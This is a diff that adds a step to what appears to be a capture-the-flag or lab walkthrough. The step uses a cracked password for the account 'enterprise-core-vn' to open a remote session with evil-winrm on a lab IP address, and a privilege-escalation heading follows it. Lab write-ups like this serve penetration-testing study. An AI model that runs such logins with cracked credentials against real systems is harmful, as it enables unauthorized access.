@@ -90,6 +90,13 @@ Now we can try crack it the same way as before:
 
 ![cracked2](/images/cracked2.jpg)
 
+We have now the cracked password for the account 'enterprise-core-vn'. Let's attempt a remote connection:
+
+```
+evil-winrm -i 10.10.171.250 -u 'enterprise-core-vn' -p 'ry=ibfkfv,s6h,' 
+```
+
+![remote](/images/remote.jpg)
 
 
 ## Privilege escalation
